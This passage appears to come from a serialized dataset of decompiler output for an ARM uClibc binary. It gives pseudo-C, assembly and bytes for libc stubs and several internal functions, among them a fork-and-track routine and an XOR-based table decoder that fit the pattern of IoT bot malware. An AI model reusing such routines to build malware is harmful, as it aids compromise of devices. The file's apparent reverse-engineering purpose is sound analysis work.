f0\n.text:0000aaf4\n.text:0000aaf8\n.text:0000aafc\n.text:0000ab00\n.text:0000ab04\n.text:0000ab08\n.text:0000ab0c\n.text:0000ab10\n.text:0000ab14\n.text:0000ab18\n.text:0000ab1c\n.text:0000ab20\n.text:0000ab24\n.text:0000ab28\n.text:0000ab2c\n.text:0000ab30\n.text:0000ab34\n.text:0000ab38\n.text:0000ab3c\n.text:0000ab40\n.text:0000ab44\n.text:0000ab48\n.text:0000ab4c\n.text:0000ab50\n.text:0000ab54\n.text:0000ab58\n.text:0000ab5c\n.text:0000ab60\n.text:0000ab64\n.text:0000ab68\n.text:0000ab6c\n.text:0000ab70\n.text:0000ab74\n.text:0000ab78\n.text:0000ab7c\n.text:0000ab80\n.text:0000ab84\n.text:0000ab88\n.text:0000ab8c\n.text:0000ab90\n.text:0000ab94\n.text:0000ab98\n.text:0000ab9c\n.text:0000aba0\n.text:0000aba4\n.text:0000aba8\n.text:0000abac\n.text:0000abb0\n.text:0000abb4\n.text:0000abb8\n.text:0000abbc\n.text:0000abc0\n.text:0000abc4\n.text:0000abc8\n.text:0000abcc\n.text:0000abd0\n.text:0000abd4\n.text:0000abd8\n.text:0000abdc\n.text:0000abe0\n.text:0000abe4\n.text:0000abe8\n.text:0000abec\n.text:0000abf0\n.text:0000abf4\n.text:0000abf8\n.text:0000abfc\n.text:0000ac00\n.text:0000ac04\n.text:0000ac08\n.text:0000ac0c\n.text:0000ac10\n.text:0000ac14\n.text:0000ac18\n.text:0000ac1c\n.text:0000ac20\n.text:0000ac24\n.text:0000ac28\n.text:0000ac2c\n.text:0000ac30\n.text:0000ac34\n.text:0000ac38\n.text:0000ac3c\n.text:0000ac40\n.text:0000ac44\n.text:0000ac48\n.text:0000ac4c\n.text:0000ac50\n.text:0000ac54\n.text:0000ac58\n.text:0000ac5c\n.text:0000ac60\n.text:0000ac64\n.text:0000ac68\n.text:0000ac6c\n.text:0000ac70\n.text:0000ac74\n.text:0000ac78\n.text:0000ac7c\n.text:0000ac80\n.text:0000ac84\n.text:0000ac88\n.text:0000ac8c\n.text:0000ac90\n.text:0000ac94\n.text:0000ac98\n.text:0000ac9c\n.text:0000aca0\n.text:0000aca4\n.text:0000aca8\n.text:0000acac\n.text:0000acb0\n.text:0000acb4\n.text:0000acb8\n.text:0000acbc\n.text:0000acc0\n.text:0000acc4\n.text:0000acc8\n.text:0000accc\n.text:0000acd0\n.text:0000acd4\n.text:0000acd8\n.text:0000acdc\n.text:0000ace0\n.text:0000ace4\n.text:0000ace8\n.text:0000acec\n.text:0000acf0\n.text:0000acf4\n.text:0000acf8\n.text:0000acfc\n.text:0000ad00\n.text:0000ad04\n.text:0000ad08\n.text:0000ad0c\n.text:0000ad10\n.text:0000ad14\n.text:0000ad18\n.text:0000ad1c\n.text:0000ad20\n.text:0000ad24\n.text:0000ad28\n.text:0000ad2c\n.text:0000ad30\n.text:0000ad34\n.text:0000ad38\n.text:0000ad3c\n.text:0000ad40\n.text:0000ad44\n.text:0000ad48\n.text:0000ad4c\n.text:0000ad50\n.text:0000ad54\n.text:0000ad58\n.text:0000ad5c\n.text:0000ad60\n.text:0000ad64\n.text:0000ad68\n.text:0000ad6c\n.text:0000ad70\n.text:0000ad74\n.text:0000ad78\n.text:0000ad7c\n.text:0000ad80\n.text:0000ad84\n.text:0000ad88\n.text:0000ad8c\n.text:0000ad90\n.text:0000ad94\n.text:0000ad98\n.text:0000ad9c\n.text:0000ada0\n.text:0000ada4\n.text:0000ada8\n.text:0000adac\n.text:0000adb0\n.text:0000adb4\n.text:0000adb8\n.text:0000adbc\n.text:0000adc0\n.text:0000adc4\n.text:0000adc8\n.text:0000adcc\n.text:0000add0\n.text:0000add4\n.text:0000add8\n.text:0000addc\n.text:0000ade0\n.text:0000ade4\n'
p237
tp238
sS'memset'
p239
(S'\n__stdcall memset(void * __s, int __c, size_t __n)\n'
p240
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * memset(void *__s,int __c,size_t __n)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b20. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_00014148)();\u000a  return pvVar1;\u000a}\u000a\u000a
p241
S'adr r12,0x8b20\nadd r12,r12,#0xb000\nldr pc,[r12,#0x628]!\n'
p242
S'00 c6 8f e2\n0b ca 8c e2\n28 f6 bc e5\n'
p243
S'.plt:00008b18\n.plt:00008b1c\n.plt:00008b20\n'
p244
tp245
sS'setsid'
p246
(S'\n__stdcall setsid()\n'
p247
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t setsid(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008bbc. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_0001417c)();\u000a  return _Var1;\u000a}\u000a\u000a
p248
S'adr r12,0x8bbc\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5c0]!\n'
p249
S'00 c6 8f e2\n0b ca 8c e2\nc0 f5 bc e5\n'
p250
S'.plt:00008bb4\n.plt:00008bb8\n.plt:00008bbc\n'
p251
tp252
sS'exit'
p253
(S'\n__stdcall exit(int __status)\n'
p254
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid exit(int __status)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008b74. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00014164)();\u000a  return;\u000a}\u000a\u000a
p255
S'adr r12,0x8b74\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5f0]!\n'
p256
S'00 c6 8f e2\n0b ca 8c e2\nf0 f5 bc e5\n'
p257
S'.plt:00008b6c\n.plt:00008b70\n.plt:00008b74\n'
p258
tp259
sS'FUN_0000b510'
p260
(S'\n__stdcall FUN_0000b510()\n'
p261
V\u000avoid FUN_0000b510(undefined *puParm1,int iParm2)\u000a\u000a{\u000a  int local_20;\u000a  undefined *local_14;\u000a  \u000a  local_20 = iParm2;\u000a  local_14 = puParm1;\u000a  while (local_20 = local_20 + -1, local_20 != -1) {\u000a    *local_14 = 0;\u000a    local_14 = local_14 + 1;\u000a  }\u000a  return;\u000a}\u000a\u000a
p262
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x10\nstr r0,[r11,#-0x18]\nstr r1,[r11,#-0x1c]\nldr r3,[r11,#-0x18]\nstr r3,[r11,#-0x10]\nb 0x0000b54c\nldr r2,[r11,#-0x10]\nmov r3,#0x0\nstrb r3,[r2,#0x0]\nldr r3,[r11,#-0x10]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x1c]\nsub r3,r3,#0x1\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\ncmn r3,#0x1\nbne 0x0000b534\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p263
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n10 d0 4d e2\n18 00 0b e5\n1c 10 0b e5\n18 30 1b e5\n10 30 0b e5\n05 00 00 ea\n10 20 1b e5\n00 30 a0 e3\n00 30 c2 e5\n10 30 1b e5\n01 30 83 e2\n10 30 0b e5\n1c 30 1b e5\n01 30 43 e2\n1c 30 0b e5\n1c 30 1b e5\n01 00 73 e3\nf3 ff ff 1a\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p264
S'.text:0000b510\n.text:0000b514\n.text:0000b518\n.text:0000b51c\n.text:0000b520\n.text:0000b524\n.text:0000b528\n.text:0000b52c\n.text:0000b530\n.text:0000b534\n.text:0000b538\n.text:0000b53c\n.text:0000b540\n.text:0000b544\n.text:0000b548\n.text:0000b54c\n.text:0000b550\n.text:0000b554\n.text:0000b558\n.text:0000b55c\n.text:0000b560\n.text:0000b564\n.text:0000b568\n.text:0000b56c\n'
p265
tp266
sS'abort'
p267
(S'\n__stdcall abort()\n'
p268
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid abort(void)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008a60. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00014108)();\u000a  return;\u000a}\u000a\u000a
p269
S'adr r12,0x8a60\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6a8]!\n'
p270
S'00 c6 8f e2\n0b ca 8c e2\na8 f6 bc e5\n'
p271
S'.plt:00008a58\n.plt:00008a5c\n.plt:00008a60\n'
p272
tp273
sS'FUN_0000ba2c'
p274
(S'\n__stdcall FUN_0000ba2c()\n'
p275
V\u000avoid FUN_0000ba2c(byte bParm1,void *pvParm2,size_t sParm3)\u000a\u000a{\u000a  void *__dest;\u000a  \u000a  __dest = malloc(sParm3);\u000a  memcpy(__dest,pvParm2,sParm3);\u000a  *(void **)(PTR_DAT_0000bab8 + (uint)bParm1 * 8) = __dest;\u000a  *(short *)(PTR_DAT_0000bab8 + (uint)bParm1 * 8 + 4) = (short)sParm3;\u000a  return;\u000a}\u000a\u000a
p276
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x18\ncpy r3,r0\nstr r1,[r11,#-0x1c]\nstr r2,[r11,#-0x20]\nstrb r3,[r11,#-0x15]\nldr r3,[r11,#-0x20]\ncpy r0,r3\nbl 0x00008a10\ncpy r3,r0\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x20]\nldr r0,[r11,#-0x10]\nldr r1,[r11,#-0x1c]\ncpy r2,r3\nbl 0x00008a04\nldrb r1,[r11,#-0x15]\nldr r2,[0xbab8]\nldr r3,[r11,#-0x10]\nstr r3,[r2,r1,lsl #0x3]\nldrb r0,[r11,#-0x15]\nldr r3,[r11,#-0x20]\nmov r3,r3, lsl #0x10\nmov r12,r3, lsr #0x10\nldr r2,[0xbab8]\nmov r1,#0x4\nmov r3,r0, lsl #0x3\nadd r3,r3,r2\nadd r3,r3,r1\nstrh r12,[r3,#0x0]\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p277
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n18 d0 4d e2\n00 30 a0 e1\n1c 10 0b e5\n20 20 0b e5\n15 30 4b e5\n20 30 1b e5\n03 00 a0 e1\ned f3 ff eb\n00 30 a0 e1\n10 30 0b e5\n20 30 1b e5\n10 00 1b e5\n1c 10 1b e5\n03 20 a0 e1\ne3 f3 ff eb\n15 10 5b e5\n38 20 9f e5\n10 30 1b e5\n81 31 82 e7\n15 00 5b e5\n20 30 1b e5\n03 38 a0 e1\n23 c8 a0 e1\n1c 20 9f e5\n04 10 a0 e3\n80 31 a0 e1\n02 30 83 e0\n01 30 83 e0\nb0 c0 c3 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p278
S'.text:0000ba2c\n.text:0000ba30\n.text:0000ba34\n.text:0000ba38\n.text:0000ba3c\n.text:0000ba40\n.text:0000ba44\n.text:0000ba48\n.text:0000ba4c\n.text:0000ba50\n.text:0000ba54\n.text:0000ba58\n.text:0000ba5c\n.text:0000ba60\n.text:0000ba64\n.text:0000ba68\n.text:0000ba6c\n.text:0000ba70\n.text:0000ba74\n.text:0000ba78\n.text:0000ba7c\n.text:0000ba80\n.text:0000ba84\n.text:0000ba88\n.text:0000ba8c\n.text:0000ba90\n.text:0000ba94\n.text:0000ba98\n.text:0000ba9c\n.text:0000baa0\n.text:0000baa4\n.text:0000baa8\n.text:0000baac\n.text:0000bab0\n.text:0000bab4\n'
p279
tp280
sS'sigemptyset'
p281
(S'\n__stdcall sigemptyset(sigset_t * __set)\n'
p282
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint sigemptyset(sigset_t *__set)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089e8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000140e0)();\u000a  return iVar1;\u000a}\u000a\u000a
p283
S'adr r12,0x89e8\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6f8]!\n'
p284
S'00 c6 8f e2\n0b ca 8c e2\nf8 f6 bc e5\n'
p285
S'.plt:000089e0\n.plt:000089e4\n.plt:000089e8\n'
p286
tp287
sS'FUN_000095e8'
p288
(S'\n__stdcall FUN_000095e8()\n'
p289
V\u000a__pid_t FUN_000095e8(char *pcParm1)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  int local_14;\u000a  \u000a  _Var1 = fork();\u000a  if (_Var1 != 0) {\u000a    local_14 = 0;\u000a    while (local_14 < 100) {\u000a      if (*(int *)(PTR_DAT_000096f4 + local_14 * 0x68) == 0) {\u000a        *(__pid_t *)(PTR_DAT_000096f4 + local_14 * 0x68) = _Var1;\u000a        strcpy(PTR_DAT_000096f4 + local_14 * 0x68 + 4,pcParm1);\u000a        return _Var1;\u000a      }\u000a      local_14 = local_14 + 1;\u000a    }\u000a  }\u000a  return _Var1;\u000a}\u000a\u000a
p290
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x10\nstr r0,[r11,#-0x18]\nbl 0x00008b00\ncpy r3,r0\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x14]\ncmp r3,#0x0\nbne 0x00009620\nldr r3,[r11,#-0x14]\nstr r3,[r11,#-0x1c]\nb 0x000096e0\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nb 0x000096cc\nldr r1,[r11,#-0x10]\nldr r0,[0x96f4]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r3,r3,r0\nldr r3,[r3,#0x0]\ncmp r3,#0x0\nbne 0x000096c0\nldr r1,[r11,#-0x10]\nldr r0,[r11,#-0x14]\nldr r12,[0x96f4]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r3,r3,r12\nstr r0,[r3,#0x0]\nldr r1,[r11,#-0x10]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r2,r3, lsl #0x3\nldr r3,[0x96f4]\nadd r3,r2,r3\nadd r3,r3,#0x4\ncpy r0,r3\nldr r1,[r11,#-0x18]\nbl 0x000089bc\nb 0x000096d8\nldr r3,[r11,#-0x10]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\ncmp r3,#0x63\nble 0x0000962c\nldr r3,[r11,#-0x14]\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p291
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n10 d0 4d e2\n18 00 0b e5\n3f fd ff eb\n00 30 a0 e1\n14 30 0b e5\n14 30 1b e5\n00 00 53 e3\n02 00 00 1a\n14 30 1b e5\n1c 30 0b e5\n2f 00 00 ea\n00 30 a0 e3\n10 30 0b e5\n27 00 00 ea\n10 10 1b e5\nbc 00 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n00 30 83 e0\n00 30 93 e5\n00 00 53 e3\n18 00 00 1a\n10 10 1b e5\n14 00 1b e5\n88 c0 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n0c 30 83 e0\n00 00 83 e5\n10 10 1b e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 21 a0 e1\n48 30 9f e5\n03 30 82 e0\n04 30 83 e2\n03 00 a0 e1\n18 10 1b e5\nbf fc ff eb\n05 00 00 ea\n10 30 1b e5\n01 30 83 e2\n10 30 0b e5\n10 30 1b e5\n63 00 53 e3\nd4 ff ff da\n14 30 1b e5\n1c 30 0b e5\n1c 30 1b e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p292
S'.text:000095e8\n.text:000095ec\n.text:000095f0\n.text:000095f4\n.text:000095f8\n.text:000095fc\n.text:00009600\n.text:00009604\n.text:00009608\n.text:0000960c\n.text:00009610\n.text:00009614\n.text:00009618\n.text:0000961c\n.text:00009620\n.text:00009624\n.text:00009628\n.text:0000962c\n.text:00009630\n.text:00009634\n.text:00009638\n.text:0000963c\n.text:00009640\n.text:00009644\n.text:00009648\n.text:0000964c\n.text:00009650\n.text:00009654\n.text:00009658\n.text:0000965c\n.text:00009660\n.text:00009664\n.text:00009668\n.text:0000966c\n.text:00009670\n.text:00009674\n.text:00009678\n.text:0000967c\n.text:00009680\n.text:00009684\n.text:00009688\n.text:0000968c\n.text:00009690\n.text:00009694\n.text:00009698\n.text:0000969c\n.text:000096a0\n.text:000096a4\n.text:000096a8\n.text:000096ac\n.text:000096b0\n.text:000096b4\n.text:000096b8\n.text:000096bc\n.text:000096c0\n.text:000096c4\n.text:000096c8\n.text:000096cc\n.text:000096d0\n.text:000096d4\n.text:000096d8\n.text:000096dc\n.text:000096e0\n.text:000096e4\n.text:000096e8\n.text:000096ec\n.text:000096f0\n'
p293
tp294
sS'send'
p295
(S'\n__stdcall send(int __fd, void * __buf, size_t __n, int __flags)\n'
p296
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t send(int __fd,void *__buf,size_t __n,int __flags)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a54. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_00014104)();\u000a  return sVar1;\u000a}\u000a\u000a
p297
S'adr r12,0x8a54\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6b0]!\n'
p298
S'00 c6 8f e2\n0b ca 8c e2\nb0 f6 bc e5\n'
p299
S'.plt:00008a4c\n.plt:00008a50\n.plt:00008a54\n'
p300
tp301
sS'inet_addr'
p302
(S'\n__stdcall inet_addr(char * __cp)\n'
p303
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000ain_addr_t inet_addr(char *__cp)\u000a\u000a{\u000a  in_addr_t iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a9c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_0001411c)();\u000a  return iVar1;\u000a}\u000a\u000a
p304
S'adr r12,0x8a9c\nadd r12,r12,#0xb000\nldr pc,[r12,#0x680]!\n'
p305
S'00 c6 8f e2\n0b ca 8c e2\n80 f6 bc e5\n'
p306
S'.plt:00008a94\n.plt:00008a98\n.plt:00008a9c\n'
p307
tp308
sS'sigaddset'
p309
(S'\n__stdcall sigaddset(sigset_t * __set, int __signo)\n'
p310
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint sigaddset(sigset_t *__set,int __signo)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a48. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014100)();\u000a  return iVar1;\u000a}\u000a\u000a
p311
S'adr r12,0x8a48\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6b8]!\n'
p312
S'00 c6 8f e2\n0b ca 8c e2\nb8 f6 bc e5\n'
p313
S'.plt:00008a40\n.plt:00008a44\n.plt:00008a48\n'
p314
tp315
sS'_start'
p316
(S'\n__stdcall _start(undefined param_1, undefined param_2, undefined param_3, undefined param_4, undefined4 param_5)\n'
p317
V\u000avoid _start(undefined4 param_1)\u000a\u000a{\u000a  undefined4 param_5;\u000a  \u000a  __uClibc_main(PTR_LAB_00008cc4,param_5,&stack0x00000004,PTR__DT_INIT_00008cc8,\u000a                PTR__DT_FINI_00008cc0,param_1);\u000a  return;\u000a}\u000a\u000a
p318
S'mov r11,#0x0\nmov lr,#0x0\nldr r1,[sp],#0x4\ncpy r2,sp\nstr r2,[sp,#-0x4]!\nstr r0,[sp,#-0x4]!\nldr r12,[0x8cc0]\nstr r12,[sp,#-0x4]!\nldr r0,[0x8cc4]\nldr r3,[0x8cc8]\nb 0x00008b0c\n'
p319
S'00 b0 a0 e3\n00 e0 a0 e3\n04 10 9d e4\n0d 20 a0 e1\n04 20 2d e5\n04 00 2d e5\n10 c0 9f e5\n04 c0 2d e5\n0c 00 9f e5\n0c 30 9f e5\n93 ff ff ea\n'
p320
S'.text:00008c90\n.text:00008c94\n.text:00008c98\n.text:00008c9c\n.text:00008ca0\n.text:00008ca4\n.text:00008ca8\n.text:00008cac\n.text:00008cb0\n.text:00008cb4\n.text:00008cb8\n'
p321
tp322
sS'fcntl'
p323
(S'\n__stdcall fcntl(int __fd, int __cmd)\n'
p324
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint fcntl(int __fd,int __cmd,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008bc8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014180)();\u000a  return iVar1;\u000a}\u000a\u000a
p325
S'adr r12,0x8bc8\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5b8]!\n'
p326
S'00 c6 8f e2\n0b ca 8c e2\nb8 f5 bc e5\n'
p327
S'.plt:00008bc0\n.plt:00008bc4\n.plt:00008bc8\n'
p328
tp329
sS'FUN_0000babc'
p330
(S'\n__stdcall FUN_0000babc()\n'
p331
V\u000avoid FUN_0000babc(byte bParm1)\u000a\u000a{\u000a  int *piVar1;\u000a  undefined4 uVar2;\u000a  undefined4 uVar3;\u000a  undefined4 uVar4;\u000a  undefined4 uVar5;\u000a  int local_1c;\u000a  \u000a  piVar1 = (int *)(PTR_DAT_0000bc34 + (uint)bParm1 * 8);\u000a  uVar2 = *(undefined4 *)PTR_DAT_0000bc38;\u000a  uVar3 = *(undefined4 *)PTR_DAT_0000bc38;\u000a  uVar4 = *(undefined4 *)PTR_DAT_0000bc38;\u000a  uVar5 = *(undefined4 *)PTR_DAT_0000bc38;\u000a  local_1c = 0;\u000a  while (local_1c < (int)(uint)*(ushort *)(piVar1 + 1)) {\u000a    *(byte *)(*piVar1 + local_1c) = *(byte *)(*piVar1 + local_1c) ^ (byte)uVar2;\u000a    *(byte *)(*piVar1 + local_1c) = *(byte *)(*piVar1 + local_1c) ^ (byte)((uint)uVar3 >> 8);\u000a    *(byte *)(*piVar1 + local_1c) = *(byte *)(*piVar1 + local_1c) ^ (byte)((uint)uVar4 >> 0x10);\u000a    *(byte *)(*piVar1 + local_1c) = *(byte *)(*piVar1 + local_1c) ^ (byte)((uint)uVar5 >> 0x18);\u000a    local_1c = local_1c + 1;\u000a  }\u000a  return;\u000a}\u000a\u000a
p332
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x18\ncpy r3,r0\nstrb r3,[r11,#-0x1d]\nldrb r3,[r11,#-0x1d]\nmov r3,r3, lsl #0x3\ncpy r2,r3\nldr r3,[0xbc34]\nadd r3,r2,r3\nstr r3,[r11,#-0x14]\nldr r3,[0xbc38]\nldr r3,[r3,#0x0]\nstrb r3,[r11,#-0x10]\nldr r3,[0xbc38]\nldr r3,[r3,#0x0]\nmov r3,r3, lsr #0x8\nstrb r3,[r11,#-0xf]\nldr r3,[0xbc38]\nldr r3,[r3,#0x0]\nmov r3,r3, lsr #0x10\nstrb r3,[r11,#-0xe]\nldr r3,[0xbc38]\nldr r3,[r3,#0x0]\nmov r3,r3, lsr #0x18\nstrb r3,[r11,#-0xd]\nmov r3,#0x0\nstr r3,[r11,#-0x18]\nb 0x0000bc10\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r1,r2,r3\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r2,r3\nldrb r2,[r3,#0x0]\nldrb r3,[r11,#-0x10]\neor r3,r2,r3\nand r3,r3,#0xff\nstrb r3,[r1,#0x0]\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r1,r2,r3\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r2,r3\nldrb r2,[r3,#0x0]\nldrb r3,[r11,#-0xf]\neor r3,r2,r3\nand r3,r3,#0xff\nstrb r3,[r1,#0x0]\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r1,r2,r3\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r2,r3\nldrb r2,[r3,#0x0]\nldrb r3,[r11,#-0xe]\neor r3,r2,r3\nand r3,r3,#0xff\nstrb r3,[r1,#0x0]\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r1,r2,r3\nldr r3,[r11,#-0x14]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r2,r3\nldrb r2,[r3,#0x0]\nldrb r3,[r11,#-0xd]\neor r3,r2,r3\nand r3,r3,#0xff\nstrb r3,[r1,#0x0]\nldr r3,[r11,#-0x18]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x14]\nldrh r3,[r3,#0x4]\ncpy r2,r3\nldr r3,[r11,#-0x18]\ncmp r2,r3\nbgt 0x0000bb34\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p333
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n18 d0 4d e2\n00 30 a0 e1\n1d 30 4b e5\n1d 30 5b e5\n83 31 a0 e1\n03 20 a0 e1\n4c 31 9f e5\n03 30 82 e0\n14 30 0b e5\n44 31 9f e5\n00 30 93 e5\n10 30 4b e5\n38 31 9f e5\n00 30 93 e5\n23 34 a0 e1\n0f 30 4b e5\n28 31 9f e5\n00 30 93 e5\n23 38 a0 e1\n0e 30 4b e5\n18 31 9f e5\n00 30 93 e5\n23 3c a0 e1\n0d 30 4b e5\n00 30 a0 e3\n18 30 0b e5\n36 00 00 ea\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 10 82 e0\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 30 82 e0\n00 20 d3 e5\n10 30 5b e5\n03 30 22 e0\nff 30 03 e2\n00 30 c1 e5\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 10 82 e0\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 30 82 e0\n00 20 d3 e5\n0f 30 5b e5\n03 30 22 e0\nff 30 03 e2\n00 30 c1 e5\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 10 82 e0\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 30 82 e0\n00 20 d3 e5\n0e 30 5b e5\n03 30 22 e0\nff 30 03 e2\n00 30 c1 e5\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 10 82 e0\n14 30 1b e5\n00 20 93 e5\n18 30 1b e5\n03 30 82 e0\n00 20 d3 e5\n0d 30 5b e5\n03 30 22 e0\nff 30 03 e2\n00 30 c1 e5\n18 30 1b e5\n01 30 83 e2\n18 30 0b e5\n14 30 1b e5\nb4 30 d3 e1\n03 20 a0 e1\n18 30 1b e5\n03 00 52 e1\nc2 ff ff ca\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p334
S'.text:0000babc\n.text:0000bac0\n.text:0000bac4\n.text:0000bac8\n.text:0000bacc\n.text:0000bad0\n.text:0000bad4\n.text:0000bad8\n.text:0000badc\n.text:0000bae0\n.text:0000bae4\n.text:0000bae8\n.text:0000baec\n.text:0000baf0\n.text:0000baf4\n.text:0000baf8\n.text:0000bafc\n.text:0000bb00\n.text:0000bb04\n.text:0000bb08\n.text:0000bb0c\n.text:0000bb10\n.text:0000bb14\n.text:0000bb18\n.text:0000bb1c\n.text:0000bb20\n.text:0000bb24\n.text:0000bb28\n.text:0000bb2c\n.text:0000bb30\n.text:0000bb34\n.text:0000bb38\n.text:0000bb3c\n.text:0000bb40\n.text:0000bb44\n.text:0000bb48\n.text:0000bb4c\n.text:0000bb50\n.text:0000bb54\n.text:0000bb58\n.text:0000bb5c\n.text:0000bb60\n.text:0000bb64\n.text:0000bb68\n.text:0000bb6c\n.text:0000bb70\n.text:0000bb74\n.text:0000bb78\n.text:0000bb7c\n.text:0000bb80\n.text:0000bb84\n.text:0000bb88\n.text:0000bb8c\n.text:0000bb90\n.text:0000bb94\n.text:0000bb98\n.text:0000bb9c\n.text:0000bba0\n.text:0000bba4\n.text:0000bba8\n.text:0000bbac\n.text:0000bbb0\n.text:0000bbb4\n.text:0000bbb8\n.text:0000bbbc\n.text:0000bbc0\n.text:0000bbc4\n.text:0000bb